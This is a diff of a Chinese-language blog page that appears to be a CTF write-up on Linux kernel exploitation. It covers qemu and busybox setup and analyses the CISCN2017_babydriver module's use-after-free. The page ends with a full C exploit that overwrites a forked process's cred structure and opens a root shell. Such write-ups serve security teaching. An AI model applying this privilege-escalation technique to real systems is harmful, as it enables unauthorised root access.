@@ -75,7 +75,7 @@
         		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
             	<ul class="sb-submenu">
 				  	
-				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(23)</small></a></li>
+				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(22)</small></a></li>
 				    
 				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
 				    
@@ -263,14 +263,12 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-zwQLLqGw" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div>     
-
+    <div id="aplayer-blbwzbQE" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div>     
 <h2><span id="环境搭建">环境搭建</span></h2><p>一般来说教程都会要求我们编译一个内核，安装一个busybox以及qemu，但是实际做题需要的环境只有qemu，因为题目会提供一个内核镜像，而busybox也不是必须，但是在这里还是都搭建一下。</p>
 <h3><span id="qemu">qemu</span></h3><p>一般来说elf的话只需要用包管理器下载：<br><code>sudo apt install qemu-system</code></p>
 <p>有特殊需求可以用源码编译。但是暂时就省去这一步了。</p>
 <p>（ps：这里有一个坑，对于macos + pd的组合，你的pd版本如果是普通的家庭版，将不会支持嵌套虚拟化，也就是四舍五入qemu运行不了，要么换vmware要么花钱升级。我这里选择的是vmware，但是vmware最好也要12.2以上（还是针对intel的情况，m系不清楚），不然会出现各种奇怪的问题）</p>
 <h3><span id="kernel">kernel</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.9.8.tar.xz</span><br><span class="line">unxz linux-5.9.8.tar.xz</span><br><span class="line">tar -xf linux-5.9.8.tar</span><br><span class="line"><span class="built_in">cd</span> linux-5.9.8</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
-
 <p>这一步弹出一个图形化窗口，选择</p>
 <p><code>Kernel hacking -&gt; Compile-time checks and compiler options -&gt; Compile the kernel with debug info</code></p>
 <p><code>Kernel hacking -&gt; Generic Kernel Debugging Instruments -&gt; KGDB: kernel debugger</code></p>
@@ -279,10 +277,8 @@
 <h3><span id="busybox">busybox</span></h3><p>还是下载源码编译。</p>
 <p>ubuntu 20.04 编译只有一个报错，产生的原因是没有安装<code>glibc-static</code>依赖。可以直接用包管理器安装，然后直接编译。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.34.1.tar.bz2</span><br><span class="line">tar -jxf busybox-1.34.1.tar.bz2</span><br></pre></td></tr></table></figure>
-
 <p>勾选<code>Setttings -&gt; Build static binary (no shared libs),</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> busybox-1.34.1</span><br><span class="line">make menuconfig</span><br><span class="line">make -j 8</span><br></pre></td></tr></table></figure>
-
 <p>安装到这里就差不多了，后面的步骤比较抽象，这里就直接用题目来举例。</p>
 <h2><span id="基础知识">基础知识</span></h2><p>例题还是<code>CISCN2017_babydriver</code>，可以在ctf wiki上对应章节找到原题。</p>
 <p>题目给了我们三个文件，一般来说内核题都会提供这样的三种文件。<img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-15%20%E4%B8%8B%E5%8D%882.39.57.png" alt="截屏2022-07-15 下午2.39.57"></p>
@@ -291,7 +287,6 @@
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-15%20%E4%B8%8B%E5%8D%883.20.54.png" alt="截屏2022-07-15 下午3.20.54"></p>
 <p>可以看到整个脚本主要是指定了八个参数。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 </span><br><span class="line">	-initrd_rootfs.cpio </span><br><span class="line">	-kernel bzImage</span><br><span class="line">	-append &#x27;console = ttyS0 root = /dev/ram oops = panic panic = 1&#x27;</span><br><span class="line">	-enable-kvm </span><br><span class="line">	-monitor /dev/null </span><br><span class="line">	-m 64M --nographic  </span><br><span class="line">	-smp cores=1,threads=1 </span><br><span class="line">	-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
-
 <p>这里分别解释一下。</p>
 <h5><span id="ignited">ignited</span></h5><p>设置内核启动的内存文件系统，也就是指定我们的<code>rootfs.cpio</code> 文件。</p>
 <h5><span id="kernel">kernel</span></h5><p>指定内核镜像文件的路径</p>
@@ -303,7 +298,6 @@
 <h3><span id="bzimage">bzimage</span></h3><p>​        一种主流kernel镜像模式，意为big kernel。</p>
 <h3><span id="rootscpio">roots.cpio</span></h3><p>​        可以先file一下。cpio是一种用来备份的格式，直接用对应命令解压：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure>
-
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-15%20%E4%B8%8B%E5%8D%883.58.28.png" alt="截屏2022-07-15 下午3.58.28"></p>
 <p>​        解压后则是我们运行内核需要的文件系统。</p>
 <p>​        看看init有什么吧。<img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-15%20%E4%B8%8B%E5%8D%883.59.14.png" alt="截屏2022-07-15 下午3.59.14"></p>
@@ -311,16 +305,14 @@
 <p>​        前三行的 <code>mount</code>用于挂载文件系统，例如<code>mount -t proc none /proc</code>相当于当我们访问<code>/proc</code>文件夹，就意味着我们正在访问proc分区。</p>
 <p>​        接着将flag设置为仅root可读，也就是只要我们是root权限那么就能拿到flag。</p>
 <p>​        其他的步骤比较常规，这里重点关注<code>insmod</code>这一条指令。这条指令的作用是插入模块，依赖的是linux的LKM，即动态可加载内核模块功能，在运行时插入或拔出模块。</p>
-<p>​        这里就是插入 <code>babydriver.ko    </code>这个模块。</p>
+<p>​        这里就是插入 <code>babydriver.ko</code>这个模块。</p>
 <p>​        其他的指令暂时不关注。</p>
 <p>​        这道题的漏洞就出在这个驱动上，在分析这个漏洞驱动前，先来了解一下关于驱动的知识。</p>
 <p>​        简单将驱动理解为基于内核的应用程序不可取，但是实际上这两者是有相同点的。</p>
 <p>​        一个从wiki上copy的驱动代码如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ko_test_init</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;This is a test ko!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ko_test_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;Bye Bye~\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(ko_test_init);</span><br><span class="line">module_exit(ko_test_exit);</span><br></pre></td></tr></table></figure>
-
 <p>​        将这个驱动编译，需要如下Makefile：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">obj-m += ko_test.o</span><br><span class="line"></span><br><span class="line">KDIR =/home/iromise/dev/kernel/linux-5.4.98/</span><br><span class="line"></span><br><span class="line">all:</span><br><span class="line">    $(MAKE) -C $(KDIR) M=$(PWD) modules</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">    rm -rf *.o *.ko *.mod.* *.symvers *.order</span><br></pre></td></tr></table></figure>
-
 <p>​        可以看到整个驱动似乎只实现了两件事，一问好二道别。从这一点上看和一个普通的应用程序也没有太大的差异，都是利用c语言实现一些看起来很简单的功能，但是实际上两者有本质的区别。</p>
 <p>​        驱动类似硬件以及软件之间沟通的桥梁，驱动代码看起来并不完全是嵌入式编程那样完全操纵硬件，但也在很大程度上通过一些封装的方式来控制硬件。</p>
 <p>​        换句话来说，驱动是介于硬件以及操作系统两个层级间的媒介，虽然功能看起来并不是那么的“硬”，但是也是直接针对于硬件进行管理。</p>
@@ -338,26 +330,19 @@
 <p>首先看初始化。</p>
 <h4><span id="init_module">init_module</span></h4><p>第一步</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alloc_chrdev_region(&amp;babydev_no, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">&quot;babydev&quot;</span>)</span><br></pre></td></tr></table></figure>
-
 <p>这个函数的目的则是申请一个名为<code>babydev</code>的新设备，并将设备号储存在<code>babydev_no</code>。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cdev_init(&amp;cdev_0, &amp;fops);</span><br></pre></td></tr></table></figure>
-
 <p>初始化一个cdev结构体，并设置该设备的各种操作为传入的<code>*fop</code>，即<code>file_operations</code>。</p>
 <p>这个结构体包含了很多函数指针，例如<code>read</code>，<code>write</code>等。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cdev_add(&amp;cdev, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)babydev_no, <span class="number">1LL</span>);</span><br></pre></td></tr></table></figure>
-
 <p>接着。将之前申请的设备号传入结构体。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_class_create(&amp;_this_module, <span class="string">&quot;babydev&quot;</span>, &amp;babydev_no);</span><br></pre></td></tr></table></figure>
-
 <p>创建类，存放于<code>/sys/class</code></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">device_create(v2, <span class="number">0LL</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)babydev_no, <span class="number">0LL</span>, <span class="string">&quot;babydev&quot;</span>);</span><br></pre></td></tr></table></figure>
-
 <p>总体就是将设备号所对应的设备注册进 sysfs。</p>
 <h3><span id="cleanup_module">cleanup_module</span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">device_destroy(babydev_class, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)babydev_no);</span><br><span class="line">  class_destroy(babydev_class);</span><br><span class="line">  cdev_del(&amp;cdev);</span><br><span class="line">  <span class="keyword">return</span> unregister_chrdev_region((<span class="keyword">unsigned</span> <span class="keyword">int</span>)babydev_no, <span class="number">1LL</span>);</span><br></pre></td></tr></table></figure>
-
 <p>将init创建的一些结构，类之类的全部释放。</p>
 <h3><span id="babyopen">babyopen</span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_fentry__();</span><br><span class="line">  babydev_struct = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">37748928LL</span>, <span class="number">64LL</span>);</span><br><span class="line">  qword_D98 = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure>
-
 <p>创建一个<code>babydev_struct</code>结构体，长度为64。</p>
 <h3><span id="babyrelease">babyrelease</span></h3><p>相当于free，并且对结构体free后没有将指针置0/</p>
 <h3><span id="babyreadampwirte">babyread&amp;wirte</span></h3><p>比较普通，没有什么特别值得关注的。</p>
@@ -374,7 +359,6 @@
 </ol>
 <p>这个题就可以用这个方法，该内核版本下cred的大小是0xa8，所以我们只需要申请一个0xa8大小的device buf，并释放，再fork新进程，此时新进程的cred结构体就会用到我们刚才释放的内存空间，于是就可以利用uaf对其进行覆写。</p>
 <h2><span id="exp">exp</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> device1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">int</span> device2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	ioctl(device1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">	close(device1);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> new_process_pid = fork();</span><br><span class="line">	<span class="keyword">if</span> (new_process_pid &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[*] fork error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (new_process_pid == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span> lots_zero[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">		write(device2, lots_zero, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;[*] got root&quot;</span>);</span><br><span class="line">			system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		wait(<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	close(device2);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>好阴间，我还没有调好这个虚拟机的复制粘贴。目前就这样吧。</p>
 <h2><span id="参考">参考</span></h2><p><a target="_blank" rel="noopener" href="https://kiprey.github.io/2021/10/kernel_pwn_introduction/#1-babydriver-init">https://kiprey.github.io/2021/10/kernel_pwn_introduction/#1-babydriver-init</a></p>
 <p><a target="_blank" rel="noopener" href="https://cjovi.icu/pwnreview/1408.html">https://cjovi.icu/pwnreview/1408.html</a></p>
